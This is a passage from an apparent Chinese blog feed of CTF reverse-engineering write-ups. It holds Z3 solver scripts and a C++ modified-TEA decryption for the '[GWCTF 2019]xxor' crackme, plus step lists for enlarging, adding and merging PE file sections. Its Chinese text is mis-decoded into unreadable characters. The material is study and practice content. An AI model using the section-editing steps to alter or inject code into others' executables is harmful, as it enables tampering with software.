class="number">0x3FC00F01B405AD5E</span>]</span><br><span class="line"></span><br><span class="line">xor_value = BitVecVal(<span class="number">0x71234EA7D92996F5</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">flag = BitVec(<span class="string">&#x27;flag&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">v11=<span class="number">255</span></span><br><span class="line"><span class="comment"># åˆ›å»ºæ±‚è§£å™¨</span></span><br><span class="line">s = Solver()</span><br><span class="line">temp = flag</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(v11,<span class="number">0</span>,-<span class="number">5</span>):</span><br><span class="line">    v12 = (<span class="number">2</span> * temp) ^ xor_value</span><br><span class="line">    v12 = If(temp &gt;= <span class="number">0</span>, <span class="number">2</span> * temp, v12)</span><br><span class="line">    </span><br><span class="line">    v13 = (<span class="number">2</span> * v12) ^ xor_value</span><br><span class="line">    v13 = If(v12 &gt;= <span class="number">0</span>, <span class="number">2</span> * v12, v13)</span><br><span class="line">    </span><br><span class="line">    v14 = (<span class="number">2</span> * v13) ^ xor_value</span><br><span class="line">    v14 = If(v13 &gt;= <span class="number">0</span>, <span class="number">2</span> * v13, v14)</span><br><span class="line">    </span><br><span class="line">    v15 = (<span class="number">2</span> * v14) ^ xor_value</span><br><span class="line">    v15 = If(v14 &gt;= <span class="number">0</span>, <span class="number">2</span> * v14, v15)</span><br><span class="line">    </span><br><span class="line">    temp = (<span class="number">2</span> * v15) ^ xor_value</span><br><span class="line">    temp = If(v15 &gt;= <span class="number">0</span>, <span class="number">2</span> * v15, temp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(temp==enc[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥æ˜¯å¦æœ‰è§£</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="comment"># å¦‚æœæœ‰è§£ï¼Œæ‰“å°æ¨¡å‹</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    flag_value = m[flag].as_long()</span><br><span class="line">    flag_str = <span class="built_in">hex</span>(flag_value)</span><br><span class="line">    <span class="comment"># å»é™¤å‰ç¼€ &#x27;0x&#x27;ï¼Œå¾—åˆ°çº¯åå…­è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">    hex_str_without_prefix = flag_str[<span class="number">2</span>:]</span><br><span class="line">    byte_str = <span class="built_in">bytes</span>.fromhex(hex_str_without_prefix)</span><br><span class="line">    decoded_str = byte_str.decode(<span class="string">&#x27;utf-8&#x27;</span>) </span><br><span class="line">    final_flag+=decoded_str[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution exists&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = BitVec(<span class="string">&#x27;flag&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">v11=<span class="number">255</span></span><br><span class="line"><span class="comment"># åˆ›å»ºæ±‚è§£å™¨</span></span><br><span class="line">s = Solver()</span><br><span class="line">temp = flag</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(v11,<span class="number">0</span>,-<span class="number">5</span>):</span><br><span class="line">    v12 = (<span class="number">2</span> * temp) ^ xor_value</span><br><span class="line">    v12 = If(temp &gt;= <span class="number">0</span>, <span class="number">2</span> * temp, v12)</span><br><span class="line">    </span><br><span class="line">    v13 = (<span class="number">2</span> * v12) ^ xor_value</span><br><span class="line">    v13 = If(v12 &gt;= <span class="number">0</span>, <span class="number">2</span> * v12, v13)</span><br><span class="line">    </span><br><span class="line">    v14 = (<span class="number">2</span> * v13) ^ xor_value</span><br><span class="line">    v14 = If(v13 &gt;= <span class="number">0</span>, <span class="number">2</span> * v13, v14)</span><br><span class="line">    </span><br><span class="line">    v15 = (<span class="number">2</span> * v14) ^ xor_value</span><br><span class="line">    v15 = If(v14 &gt;= <span class="number">0</span>, <span class="number">2</span> * v14, v15)</span><br><span class="line">    </span><br><span class="line">    temp = (<span class="number">2</span> * v15) ^ xor_value</span><br><span class="line">    temp = If(v15 &gt;= <span class="number">0</span>, <span class="number">2</span> * v15, temp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(temp==enc[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥æ˜¯å¦æœ‰è§£</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="comment"># å¦‚æœæœ‰è§£ï¼Œæ‰“å°æ¨¡å‹</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    flag_value = m[flag].as_long()</span><br><span class="line">    flag_str = <span class="built_in">hex</span>(flag_value)</span><br><span class="line">    <span class="comment"># å»é™¤å‰ç¼€ &#x27;0x&#x27;ï¼Œå¾—åˆ°çº¯åå…­è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">    hex_str_without_prefix = flag_str[<span class="number">2</span>:]</span><br><span class="line">    byte_str = <span class="built_in">bytes</span>.fromhex(hex_str_without_prefix)</span><br><span class="line">    decoded_str = byte_str.decode(<span class="string">&#x27;utf-8&#x27;</span>) </span><br><span class="line">    final_flag+=decoded_str[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution exists&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = BitVec(<span class="string">&#x27;flag&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">v11=<span class="number">255</span></span><br><span class="line"><span class="comment"># åˆ›å»ºæ±‚è§£å™¨</span></span><br><span class="line">s = Solver()</span><br><span class="line">temp = flag</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(v11,<span class="number">0</span>,-<span class="number">5</span>):</span><br><span class="line">    v12 = (<span class="number">2</span> * temp) ^ xor_value</span><br><span class="line">    v12 = If(temp &gt;= <span class="number">0</span>, <span class="number">2</span> * temp, v12)</span><br><span class="line">    </span><br><span class="line">    v13 = (<span class="number">2</span> * v12) ^ xor_value</span><br><span class="line">    v13 = If(v12 &gt;= <span class="number">0</span>, <span class="number">2</span> * v12, v13)</span><br><span class="line">    </span><br><span class="line">    v14 = (<span class="number">2</span> * v13) ^ xor_value</span><br><span class="line">    v14 = If(v13 &gt;= <span class="number">0</span>, <span class="number">2</span> * v13, v14)</span><br><span class="line">    </span><br><span class="line">    v15 = (<span class="number">2</span> * v14) ^ xor_value</span><br><span class="line">    v15 = If(v14 &gt;= <span class="number">0</span>, <span class="number">2</span> * v14, v15)</span><br><span class="line">    </span><br><span class="line">    temp = (<span class="number">2</span> * v15) ^ xor_value</span><br><span class="line">    temp = If(v15 &gt;= <span class="number">0</span>, <span class="number">2</span> * v15, temp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(temp==enc[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥æ˜¯å¦æœ‰è§£</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="comment"># å¦‚æœæœ‰è§£ï¼Œæ‰“å°æ¨¡å‹</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    flag_value = m[flag].as_long()</span><br><span class="line">    flag_str = <span class="built_in">hex</span>(flag_value)</span><br><span class="line">    <span class="comment"># å»é™¤å‰ç¼€ &#x27;0x&#x27;ï¼Œå¾—åˆ°çº¯åå…­è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">    hex_str_without_prefix = flag_str[<span class="number">2</span>:]</span><br><span class="line">    byte_str = <span class="built_in">bytes</span>.fromhex(hex_str_without_prefix)</span><br><span class="line">    decoded_str = byte_str.decode(<span class="string">&#x27;utf-8&#x27;</span>) </span><br><span class="line">    final_flag+=decoded_str[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution exists&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = BitVec(<span class="string">&#x27;flag&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">v11=<span class="number">255</span></span><br><span class="line"><span class="comment"># åˆ›å»ºæ±‚è§£å™¨</span></span><br><span class="line">s = Solver()</span><br><span class="line">temp = flag</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(v11,<span class="number">0</span>,-<span class="number">5</span>):</span><br><span class="line">    v12 = (<span class="number">2</span> * temp) ^ xor_value</span><br><span class="line">    v12 = If(temp &gt;= <span class="number">0</span>, <span class="number">2</span> * temp, v12)</span><br><span class="line">    </span><br><span class="line">    v13 = (<span class="number">2</span> * v12) ^ xor_value</span><br><span class="line">    v13 = If(v12 &gt;= <span class="number">0</span>, <span class="number">2</span> * v12, v13)</span><br><span class="line">    </span><br><span class="line">    v14 = (<span class="number">2</span> * v13) ^ xor_value</span><br><span class="line">    v14 = If(v13 &gt;= <span class="number">0</span>, <span class="number">2</span> * v13, v14)</span><br><span class="line">    </span><br><span class="line">    v15 = (<span class="number">2</span> * v14) ^ xor_value</span><br><span class="line">    v15 = If(v14 &gt;= <span class="number">0</span>, <span class="number">2</span> * v14, v15)</span><br><span class="line">    </span><br><span class="line">    temp = (<span class="number">2</span> * v15) ^ xor_value</span><br><span class="line">    temp = If(v15 &gt;= <span class="number">0</span>, <span class="number">2</span> * v15, temp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(temp==enc[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥æ˜¯å¦æœ‰è§£</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="comment"># å¦‚æœæœ‰è§£ï¼Œæ‰“å°æ¨¡å‹</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    flag_value = m[flag].as_long()</span><br><span class="line">    flag_str = <span class="built_in">hex</span>(flag_value)</span><br><span class="line">    <span class="comment"># å»é™¤å‰ç¼€ &#x27;0x&#x27;ï¼Œå¾—åˆ°çº¯åå…­è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">    hex_str_without_prefix = flag_str[<span class="number">2</span>:]</span><br><span class="line">    byte_str = <span class="built_in">bytes</span>.fromhex(hex_str_without_prefix)</span><br><span class="line">    decoded_str = byte_str.decode(<span class="string">&#x27;utf-8&#x27;</span>) </span><br><span class="line">    final_flag+=decoded_str[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution exists&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(final_flag)</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒè€ƒéªŒZ3çº¦æŸå™¨çš„ä½¿ç”¨</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€z3å®è·µã€‘ã€buuã€‘[GWCTF 2019]xxor</title>
      <link href="/2024/07/16/%E3%80%90buu%E3%80%91%5BGWCTF%202019%5Dxxor/"/>
      <url>/2024/07/16/%E3%80%90buu%E3%80%91%5BGWCTF%202019%5Dxxor/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€z3-å®è·µã€‘ã€buuã€‘-GWCTF-2019-xxor"><a href="#ã€z3-å®è·µã€‘ã€buuã€‘-GWCTF-2019-xxor" class="headerlink" title="ã€z3 å®è·µã€‘ã€buuã€‘[GWCTF 2019]xxor"></a>ã€z3 å®è·µã€‘ã€buuã€‘[GWCTF 2019]xxor</h1><p>æ‹–è¿› ida ä¸­</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGWCTF%202019%5Dxxor/%5BGWCTF%202019%5Dxxor01.jpg" alt="[GWCTF 2019]xxor01"></p><p>è·Ÿè¿› main</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGWCTF%202019%5Dxxor/main.png" alt="main"></p><p>å‘ç°æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²ç»è¿‡ä¸€ä¸ª é­”æ”¹ tea åŠ å¯†ä¸æ£€æŸ¥å‡½æ•°</p><p>è·Ÿè¿›é­”æ”¹ teaï¼Œå‘ç°åªæ˜¯å°† delta å’Œå¼‚æˆ–éƒ¨åˆ†å¤šåŠ äº†ç‚¹ä¸œè¥¿</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGWCTF%202019%5Dxxor/tea.png" alt="tea"></p><p>è·Ÿè¿› sub_400700</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGWCTF%202019%5Dxxor/sub400700.png" alt="sub400700"></p><p>æ„Ÿè§‰è¦çˆ†ç ´</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGWCTF%202019%5Dxxor/v6%E5%B1%9E%E6%80%A7.jpg" alt="v6å±æ€§"></p><p>å› ä¸º v6 æ˜¯ int64ï¼Œæ‰€ä»¥è¦è®¾ç½®æˆ 64 ä½</p><p>çˆ†ç ´è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0</span>]*<span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    enc[i] = BitVec(<span class="string">&#x27;enc[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]&#x27;</span>,<span class="number">64</span>)</span><br><span class="line">flag = BitVec(<span class="string">&#x27;flag&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(enc[<span class="number">2</span>] - enc[<span class="number">3</span>] == <span class="number">0x84A236FF</span>)</span><br><span class="line">s.add(enc[<span class="number">3</span>] + enc[<span class="number">4</span>] == <span class="number">0xFA6CB703</span>)</span><br><span class="line">s.add(enc[<span class="number">2</span>] - enc[<span class="number">4</span>] == <span class="number">0x42D731A8</span>)</span><br><span class="line">s.add(enc[<span class="number">0</span>] == <span class="number">0xDF48EF7E</span>)</span><br><span class="line">s.add(enc[<span class="number">5</span>] == <span class="number">0x84F30420</span>)</span><br><span class="line">s.add(enc[<span class="number">1</span>] == <span class="number">0x20CAACF4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="comment"># å¦‚æœæœ‰è§£ï¼Œæ‰“å°æ¨¡å‹</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;6666&quot;</span>)</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;enc[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;] =&quot;</span>, <span class="built_in">hex</span>(m[enc[i]].as_long()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wrong&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(<span class="number">0x458BCD42</span> * <span class="number">64</span>))<span class="comment">#è¿™æ˜¯sumåŠ å¯†åçš„å€¼</span></span><br></pre></td></tr></table></figure><p>çˆ†ç ´å®Œå¾—åˆ°å¯†æ–‡</p><p>è¿›è¡Œè§£å¯†</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// //åŠ å¯†å‡½æ•°</span></span><br><span class="line"><span class="comment">//void encrypt (uint32_t* v, uint32_t* k) &#123;</span></span><br><span class="line"><span class="comment">//    uint32_t v0=v[0], v1=v[1], sum=0, i;     //v0,v1åˆ†åˆ«ä¸ºå­—ç¬¦ä¸²çš„ä½å­—èŠ‚é«˜å­—èŠ‚</span></span><br><span class="line"><span class="comment">//    uint32_t delta=0x458BCD42;</span></span><br><span class="line"><span class="comment">//    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];</span></span><br><span class="line"><span class="comment">//    for (i=0; i &lt; 32; i++) &#123;               //åŠ å¯†32è½®</span></span><br><span class="line"><span class="comment">//        sum += delta;</span></span><br><span class="line"><span class="comment">//        v0 += ((v1&lt;&lt;6) + k0) ^ (v1 + sum + 11) ^ ((v1&gt;&gt;9) + k1) ^ 0x20;</span></span><br><span class="line"><span class="comment">//        v1 += ((v0&lt;&lt;6) + k2) ^ (v0 + sum + 20) ^ ((v0&gt;&gt;9) + k3) ^ 0x10;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    v[0]=v0; v[1]=v1;//åŠ å¯†åå†é‡æ–°èµ‹å€¼</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//è§£å¯†å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0, v1;</span><br><span class="line">    <span class="type">uint32_t</span> delta=<span class="number">0x458BCD42</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; j += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> sum=<span class="number">0x458BCD42</span> * <span class="number">0x40</span> ;</span><br><span class="line">v0 = v[j];</span><br><span class="line">        v1 = v[j + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++)</span><br><span class="line">&#123;                        <span class="comment">//è§£å¯†æ—¶å°†åŠ å¯†ç®—æ³•çš„é¡ºåºå€’è¿‡æ¥ï¼Œè¿˜æœ‰+=å˜ä¸º-=</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">6</span>) + k2) ^ (v0 + sum + <span class="number">20</span>) ^ ((v0&gt;&gt;<span class="number">9</span>) + k3) ^ <span class="number">0x10</span>;</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">6</span>) + k0) ^ (v1 + sum + <span class="number">11</span>) ^ ((v1&gt;&gt;<span class="number">9</span>) + k1) ^ <span class="number">0x20</span>;</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[j]=v0; v[j+<span class="number">1</span>]=v1;<span class="comment">//è§£å¯†åå†é‡æ–°èµ‹å€¼</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">6</span>]=&#123;<span class="number">0xdf48ef7e</span>,<span class="number">0x20caacf4</span>,<span class="number">0xe0f30fd5</span>,<span class="number">0x5c50d8d6</span>,<span class="number">0x9e1bde2d</span>,<span class="number">0x84f30420</span>&#125;,k[<span class="number">4</span>]=&#123;<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x04</span>&#125;;</span><br><span class="line">    <span class="comment">// vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•°</span></span><br><span class="line">    <span class="comment">// kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½</span></span><br><span class="line"><span class="comment">//    printf(&quot;åŠ å¯†å‰åŸå§‹æ•°æ®ï¼š%u %u\n&quot;,v[0],v[1]);</span></span><br><span class="line"><span class="comment">//    encrypt(v, k);</span></span><br><span class="line"><span class="comment">//    printf(&quot;åŠ å¯†åçš„æ•°æ®ï¼š%u %u\n&quot;,v[0],v[1]);</span></span><br><span class="line">    <span class="built_in">decrypt</span>(v, k);</span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line"><span class="comment">//   cout &lt;&lt; *((char*)&amp;v[i] + 2) &lt;&lt; *((char*)&amp;v[i] + 1) &lt;&lt;  * ((char*)&amp;v[i]); //è¿™å¯ä»¥ç›´æ¥å¾—å‡ºflag</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llx&quot;</span>, v[i]);<span class="comment">//è¿™å¾—å‡ºçš„æ˜¯16è¿›åˆ¶éœ€è¦è¿›è¡Œè½¬æ¢</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºè®¡ç®—å‡ºæ¥çš„æ˜¯ 16 è¿›åˆ¶ï¼Œæ‰€ä»¥æŠŠ 16 è¿›åˆ¶è¾“å‡ºåéœ€è¦è¿›è¡Œè½¬æ¢ç§°ä¸ºå­—ç¬¦ä¸²Â·</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€PEã€‘æ‰©å¤§èŠ‚ã€æ–°å¢èŠ‚ã€åˆå¹¶èŠ‚</title>
      <link href="/2024/07/15/%E6%89%A9%E5%A4%A7%E8%8A%82%E3%80%81%E6%96%B0%E5%A2%9E%E8%8A%82%E3%80%81%E5%90%88%E5%B9%B6%E8%8A%82/"/>
      <url>/2024/07/15/%E6%89%A9%E5%A4%A7%E8%8A%82%E3%80%81%E6%96%B0%E5%A2%9E%E8%8A%82%E3%80%81%E5%90%88%E5%B9%B6%E8%8A%82/</url>
      
        <content type="html"><![CDATA[<h1 id="æ‰©å¤§èŠ‚ã€æ–°å¢èŠ‚ã€åˆå¹¶èŠ‚"><a href="#æ‰©å¤§èŠ‚ã€æ–°å¢èŠ‚ã€åˆå¹¶èŠ‚" class="headerlink" title="æ‰©å¤§èŠ‚ã€æ–°å¢èŠ‚ã€åˆå¹¶èŠ‚"></a>æ‰©å¤§èŠ‚ã€æ–°å¢èŠ‚ã€åˆå¹¶èŠ‚</h1><h2 id="è¯¦ç»†æŸ¥çœ‹https-bbs-kanxue-com-thread-281836-htm-msg-header-h3-9"><a href="#è¯¦ç»†æŸ¥çœ‹https-bbs-kanxue-com-thread-281836-htm-msg-header-h3-9" class="headerlink" title="è¯¦ç»†æŸ¥çœ‹https://bbs.kanxue.com/thread-281836.htm#msg_header_h3_9"></a>è¯¦ç»†æŸ¥çœ‹<a href="https://bbs.kanxue.com/thread-281836.htm#msg_header_h3_9">https://bbs.kanxue.com/thread-281836.htm#msg_header_h3_9</a></h2><h2 id="æ‰©å¤§èŠ‚"><a href="#æ‰©å¤§èŠ‚" class="headerlink" title="æ‰©å¤§èŠ‚"></a>æ‰©å¤§èŠ‚</h2><p> æœ€å¥½åªæ‰©å¤§æœ€åä¸€ä¸ªèŠ‚</p><p>1ã€åˆ†é…ä¸€å—æ–°çš„ç©ºé—´äº†ï¼Œå¤§å°ä¸ºS</p><p>2ã€å°†æœ€åä¸€ä¸ªèŠ‚çš„SizeOfRawDataå’ŒVirtualSizeæ”¹æˆN</p><p>â€‹N &#x3D; ï¼ˆSizeOfRawDataæˆ–è€…VirtualSizeå†…å­˜å¯¹é½åçš„å€¼ï¼‰+S</p><p>3ã€ä¿®æ”¹SizeOfImageå¤§å°</p><p>4ã€å¦‚æœä¸èƒ½æ‰§è¡Œå°±åœ¨èŠ‚çš„æœ«å°¾çš„Characteristicså±æ€§æ”¹æˆå…·æœ‰å¯æ‰§è¡Œçš„åŠŸèƒ½</p><h2 id="æ–°å¢èŠ‚"><a href="#æ–°å¢èŠ‚" class="headerlink" title="æ–°å¢èŠ‚"></a>æ–°å¢èŠ‚</h2><p> 1ã€å…ˆåˆ¤æ–­èŠ‚è¡¨æœ‰æ²¡æœ‰ç©ºé—´å¯ä»¥æ–°å¢ä¸€ä¸ªèŠ‚è¡¨æˆå‘˜</p><p>2ã€åœ¨èŠ‚è¡¨æ–°å¢ä¸€ä¸ªæˆå‘˜</p><p>3ã€ä¿®æ”¹PEå¤´ä¸­èŠ‚çš„æ•°é‡</p><p>4ã€ä¿®æ”¹SizeOfImageå¤§å°</p><p>5ã€åœ¨åŸæœ‰æ•°æ®çš„æœ€åï¼Œæ–°å¢ä¸€ä¸ªèŠ‚çš„æ•°æ®ï¼ˆå†…å­˜å¯¹é½æ•´æ•°ï¼‰</p><p>6ã€ä¿®æ­£æ–°å¢èŠ‚è¡¨å±æ€§</p><h2 id="åˆå¹¶èŠ‚"><a href="#åˆå¹¶èŠ‚" class="headerlink" title="åˆå¹¶èŠ‚"></a>åˆå¹¶èŠ‚</h2><p>å…ˆæ‹‰ä¼¸ï¼Œååˆå¹¶ï¼Œéœ€è¦ç”¨æ‹‰ä¼¸åçš„å¯¹é½æ³•è¿›è¡Œåˆå¹¶</p><p>1ã€æŒ‰ç…§å†…å­˜å¯¹é½å±•å¼€</p><p>2ã€å°†ç¬¬ä¸€ä¸ªèŠ‚çš„å†…å­˜å¤§å°ã€æ–‡ä»¶å¤§å°æ”¹æˆä¸€æ ·</p><p>â€‹Max &#x3D; SizeOfRawData&gt;VirtualSize ?SizeOfRawData:VirtualSize</p><p>â€‹SizeOfRawData&#x3D;VirtualSize&#x3D;æœ€åä¸€ä¸ªèŠ‚çš„VirtualAddress+Max-SizeOfHeaderså†…å­˜å¯¹é½åçš„å¤§å°</p><p>3ã€å°†ç¬¬ä¸€ä¸ªèŠ‚çš„å±æ€§æ”¹ä¸ºåŒ…å«æ‰€æœ‰èŠ‚çš„å±æ€§</p><p>4ã€ä¿®æ”¹èŠ‚çš„æ•°é‡ä¸º1</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€å¯¹çº¿ç¨‹çš„åˆè®¤è¯†å’Œåˆæ­¥ç†è§£ä¸å¹³è¡¡å †æ ˆã€‘Youngter-drive</title>
      <link href="/2024/07/15/%E3%80%90%E5%AF%B9%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%88%9D%E8%AE%A4%E8%AF%86%E5%92%8C%E5%88%9D%E6%AD%A5%E7%90%86%E8%A7%A3%E3%80%91Youngter-drive/"/>
      <url>/2024/07/15/%E3%80%90%E5%AF%B9%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%88%9D%E8%AE%A4%E8%AF%86%E5%92%8C%E5%88%9D%E6%AD%A5%E7%90%86%E8%A7%A3%E3%80%91Youngter-drive/</url>
      
